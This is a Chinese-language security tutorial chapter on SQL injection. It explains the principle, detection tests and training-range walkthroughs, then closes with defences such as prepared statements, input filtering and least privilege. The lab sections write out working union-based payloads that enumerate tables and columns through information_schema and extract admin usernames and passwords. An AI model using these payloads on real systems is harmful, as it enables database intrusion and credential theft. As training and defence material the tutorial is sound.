# Chapter 3.1 - SQLi 

[TOC]

本章所需知识前置：`MYSQL数据库基础`  `PHP基础` 

---

## 0x00 原理及相关概念

### 0b001 原理

> SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。
>
> SQL 注入攻击是一种攻击数据库的常见攻击，主要是由于开发者在编写代码时没有对输入数据的合法性进行判断，导致网页程序存在安全漏洞。

SQL注入(SQL Injection，简称SQLi)是将Web页面的URL、表单或数据包携带的参数，通过**添加或修改拼接成SQL语句**，**传递给Web服务器**，进而**传给数据库服务器**以执行数据库命令，根据程序返回的结果进行判断分析，从而获得数据库中需要的信息。其本质是通过网站开放数据库接口非法获取数据库信息。

如web应用程序的开发人员对用户所输入的数据或cookie 等内容不进行过滤或验证(即存在注入点)就直接传输给数据库， 就可能导致拼接的SQL被执行，获取数据库的信息以及修改、提权， 由此发生SQL注入攻击。

### 0b010 危害

> 知识背景：SQL注入是1998年一名叫做rfp的黑客发表的一篇文章所进入大家视线的，并在OWASP TOP10霸占榜首多年，也是目前**影响力最大，覆盖面最广**的漏洞。

1. 获取管理员账号和密码，获取数据库信息；
2. 入侵后台，实现上传有害信息，下载隐私信息；
3. 借助数据库的存储过程进行提权等操作。

## 0x01 查找/测试方法

### 0b001 查找方法

> SQL注入漏洞的检测分为手动检测和自动检测。手动检测是安全测试人员对某个特定区间的URL进行手工注入测试；自动检测是利用爬虫爬取网站的所有链接，对所有的链接自动进行注入测试。在大型应用中，手动检测的工作量是巨大的，一般采用自动检测的方式。

通常流程分为以下几个主要步骤：

1. 寻找注入点
2. 猜解表名
3. 猜解字段名
   - 联合注入查询
   - ASCII暴力破解（盲注）
   - Access数据库偏移注入
4. 获得数据库内容

### 0b010 测试方法

通过URL传参参数判断，通常存在于PHP类型（MySQL数据库）和ASP类型（Access数据库）。

几种可能存在的注入点（以GET传参类型为例）：

第一种：页面报错

1. http://www.xxx.com/xxx.php?id=1
2. http://www.xxx.com/xxx.php?id=1 and 1=1
3. http://www.xxx.com/xxx.php?id=1 and 1=2

- 在`1`时页面正常显示
- 在`2`时页面正常显示，与`1`相同
- 在`3`时页面报错

第二种：页面执行

1. http://www.xxx.com/xxx.php?id=1
2. http://www.xxx.com/xxx.php?id=2
3. http://www.xxx.com/xxx.php?id=2-1

- 在`1`时页面正常显示页面A的内容
- 在`2`时页面正常显示页面B的内容
- 在`3`时页面正常显示页面A的内容

### 0b011 获取信息

1.  **获取数据库类型信息**：

   > 网站服务器最常用的数据库有三个，分别是Access、mssql和MySQL，偶尔会用到ORACLE，通常使用场景按照网站的规模划分。

   1. `@@version()> 0`
      - 在MySQL中，可以用version()或是@@version查询版本信息，但是MSSQL只能使用@@version，所以可以通过同时使用两种方法排除出数据库版本。
   2. `user> 0`
      - user是mssql的特定函数
   3. `substring/substr`
      - 在MySQL、mssqlz中可以使用substring进行字符串裁切
      - 在ORACLE中只能使用substr
   4. `information_schema/sysobject/msysobject`
      - MySQL中的系统自带库是Information_schema
      - mssql中的固定表是sysobject
      - Access中的固定表是msysobject
   5. `banner FROM v$version`
      - ORACLE数据库特定函数，用于查询版本信息。

2. **获得表名、字段名**：

   1. 在MySQL>5.0版本的数据库中，系统自建库`Information_Schema`中生成的`tables`和`columns`表会含有所有库中的表名和字段名，可以通过限制条件查找所需信息。

   2. 在Access数据库中，由于系统承载更大的数据量和更复杂的结构关系，所以没有包含所有表结构的系统自建库，所以只能通过查询语句猜解表名和字段名。

      可利用语句：**and exists(select * from 表名)**或**and exists(select * from 字段名)**猜测表名/字段名。如果页面返回是正常的，就证明所猜测的表名正确；如果页面返回 不正常，那么就证明所猜测的表名不正确，换表名继续执行上述语句，一直到返回正常页面而猜到正确的表名/字段名。


---

## 0x02 掌控者®安全靶场实战

### 0b001 实战靶场

1. 当我们进入靶场后，点击查看新闻能够看到本页新闻信息，此时我们发现地址栏中存在`?id=1`

2. 此时我们将此参数改为`?id=2`，发现跳转到了下一个新闻页面

3. 在我们已知的PHP传参语法中可知此时以id作为变量，进行了IF等判断，并在判断后进行了从数据库取出页面的操作

4. 我们可以大胆猜测此时执行的query：

   ```mysql
   SELECT * from news where id = 1;
   ```

   -----|**接下来是验证注入**|-----

5. 为了证明一个网站是否存在SQL注入，进行一个与运算：在地址栏后加入 `and 1=2`，此时相当于进行了一个1=0的运算，可见**页面异常**，那么这个页面存在注入的几率非常高

6. 此时我们进入[靶场2](http://59.63.200.79:8014/index3.php)，输入`?id=1 and 1=1`，我们能够发现被WAF(网页防火墙)拦截了，这是目前网络上大量网站的常态，不过有WAF拦截不代表就没有SQL注入，我们试试用其他方法证明

   ![](https://www.0xaa55.com/data/attachment/forum/202008/03/051327ctp3tljr499pej94.png)

7. 我们删除"?"后所有内容，输入`id=2-1`，页面返回正常，证明网站能对我们的输入进行**算数处理**，那么这个页面存在注入的几率也非常高

---

好了，存在漏洞至此已经被我们推理出来了。此时我们回想一下联合查询语句及其功能：UNION SELECT (将两条查询语句的结果统一到一个表输出)，有了它我们在执行query语句

```SELECT * from A where id=1 UNION SELECT * from B;```

时相当于**同时查询了AB两个表的信息**。将此思想运用到我们的注入中，便可以将获取的信息的结果与合法结果连接起来。

另外，我们也知道当我们输入query语句```SELECT 1,2,3,...,n from xxx```时,我们能够得到一张n列填充了1,2,3,...,n的表，如图所示

![](https://www.0xaa55.com/data/attachment/forum/202008/03/051327xh15cc06990c5tcb.png)

我们就可以用这个特性来简单的找到页面和我们的输入交互的点（回显点）,如在[靶场1](http://59.63.200.79:8003)中，我们可以使用```?id=1 and 1=2 union select 1,2``` 得到页面回显“2”，证明表的第二列是网页的回显点。

**那么问题来了，在不知道表名的情况下从哪一个表获取信息呢？**

MySQL 5.0以 上的版本，系统会生成一个自带库存放着库和表和字段的对应关系，库名为`information_schema`。在这个库里有一个名字为`tables`的表，在此存放了所有库和表名的对应关系。例：

```mysql
SELECT table_name from tables where table_schema = 'A'; //查找A库中所有的表
```

以上语句的结果直接列出我们指定的数据库中所有的表。

![](https://www.0xaa55.com/data/attachment/forum/202008/03/051503xffihioni4nnii9c.png)

同样的，当我们不知道当前使用的表的时候，我们就可以使用database()查询，例如在[靶场1](http://59.63.200.79:8003)中，在已知第二列具有回显点后，使用```?id=1 and 1=2 union select 1,database()```便可轻易得到现在正在使用的库名"maoshe"。  

现在我们扩大范围。我们都知道query语句里指定某个库中的某张表使用的是"."运算符，如`a.b`就是<u>a库</u>中的<u>b表</u>，所以我们在此使用系统生成库`information_schema`下的总表`tables`进行**库中所有表的查找**。实现如下(默认已输入`?id=1 and 1=2`):

```mysql
UNION SELECT 1,table_name from information_schema.tables where table_schema=database()
```

回显点已经显示了库中第一张表，**正好是`admin`**，可见管理员信息就在其中。

不过我们不打算收手，因为很明显这个回显点只会输出一条信息，我们如果想要知道所有的表明，就要用到`limit`语句了。

```mysql
... limit n,m =>从n开始向下取m条数据
... limit 0,1 =>从0开始向下取1条数据 =>取第一条数据
... limit 1,1 =>从1开始向下取1条数据 =>取第二条数据
... limit 0,2 =>从0开始向下取2条数据
```

依次取表名后得到以下结果

| information_schema.tables |
| :-----------------------: |
|           admin           |
|           dirs            |
|           news            |
|            xss            |

到了这一步，数据库中所有的表名我们都掌握了。我们接下来要做的就是查询指定表中的每列信息，这里使用的是`column_name`,这同样包含在`information_schema.columns`里，例如

```mysql
... UNION SELECT 1,column_name from information_schema.columns where table_name='admin' and table_schema=database()
```

此时可见页面回显点显示了第一列标签:`Id`,那么我们继续使用`limit`检索其他列

```mysql
... limit 0,1 =>Id
... limit 1,1 =>username
... limit 2,1 =>password
... limit 3,1 =>不显示，证明admin表只有3列
```

好了，到此为止我们表名，字段名全部收集完成了，可以执行以下语句

```mysql
... UNION SELECT 1,username from admin //获取用户名
... UNION SELECT 1,password from admin //获取密码
```

这个靶场就打下来了。

### 0b010 显错注入专项靶场

1. 先通过布尔运算报错确定是否存在SQL注入。当1=1时，条件为真，页面返回结果正常；当1=2时，条件为假，页面返回结果异常；

   ![1.png](https://i.loli.net/2020/11/02/evMmzAKrWin2jZk.png)
   ![2.png](https://i.loli.net/2020/11/02/VQkjDIC9ABELlfH.png)

2. 猜解当前页面的字段数 。

   ```mysql
   and 1=1 order by 3 #由于输入order by 4后会出现报错，得知该表只有三个字段
   ```

   

   ![3.png](https://i.loli.net/2020/11/02/35f8bwO14qBeUKG.png)

3. 判断显示位置，找出输出点  

   ```mysql
   and 1=2 union select 1,2,3
   ```

   ![4.png](https://i.loli.net/2020/11/02/QsIMHqFKLk8Scgx.png)

4. 找出输出位后通过系统自建表`Information_schema.tables`查询表名

   ```mysql
   union select 1,2,table_name from information_schema.tables where table_schema=database()
   union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1
   ```


   ![5.png](https://i.loli.net/2020/11/02/qB2fLpOoUINZ8FE.png)
   					   

5. 找到需要的表名后同样通过字段名表`Information_schema.columns`查询字段名 

   ```mysql
   union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='error_flag'
   union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='error_flag' limit 1,1
   ```

   ![6.png](https://i.loli.net/2020/11/02/Bdsr2xNVFfQKUnb.png)

6. 根据字段名查出靶场flag 

   ```mysql
   union select 1,2,flag from error_flag
   union select 1,2,flag from error_flag limit 1,1
   ```

   ![7.png](https://i.loli.net/2020/11/02/Fx2PsaQbdf7ptL5.png)


## 0x03 修复方法

### 0b001 敏感字符过滤、转义

使用敏感字符过滤的方法对用户提交信息进行检查，过滤敏感的关键词，如and or union order  -- 或特殊符号等。或是通过某种转码格式进行**编码转换**，使用户输入统一作为字符串传参。

### 0b010 SQL语句预编译和绑定变量

不将用户提交的内容直接嵌入到数据库执行命令的语句中， 而是通过传入数据库前**参数进行传递**，能有效地防御SQL注入。或是**比较**用户**输入提交前后动态SQL语句的语法结构是否一致**来检测SQL注入攻击。

### 0b011 检查参数类型

与SQL语句预编译和绑定变量相似，该方法着重于在收到使用者输入的数据时，通过转义、排除固定字符后检测字段内容是否属于当前字段所需的类型。

### 0b100 严格控制权限

控制独立用户访问数据库的权限，通常会将用户映射到所要操作的数据库，并且为此映射用户单独附加权限。一般的网页交互所需的数据库应该给予用户最低权限。

## 0x04 总结

具体来说，SQL注入是利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入恶意SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

而注入攻击的本质是**把用户的输入当作代码执行**，这里的两个关键条件是：

1. 用户能**控制输入**；
2. 原本程序要执行的代码拼接用户的数据后执行。

有了这样的渗透思想之后，我们不难发现，由此衍生出的种种注入方式，不是通过例子中GET型的URL传参能够概括的，而更加多能够提供用户与WEB服务器数据交互的地方，都可能存在注入漏洞。由此可见，在渗透测试的博弈中网站开发与网站管理才是最重要的防御环节，而网站管理人员与开发人员也切不可大意。



------

**参考资料**

掌控安全讲师 - 聂风  正式课第九期《SQL注入的原理分析》

The Coding Interview 《How to prevent SQL Injection?》(https://www.youtube.com/watch?v=mo8RsfhtUG8)

Green Academy 《SQL Injection》(https://www.youtube.com/watch?v=4z8N_IdFvtw)

**参考文献**

陈炜《基于手工SQL注入的Web渗透测试技术研究》，2015． 

周敬利，王晓峰，余胜生等 《一种新的SQL注入策略的研究与实现》 ，2006 .

田宇杰，赵泽茂，张海川等《二阶SQL注入攻击防御模型》， 2014．



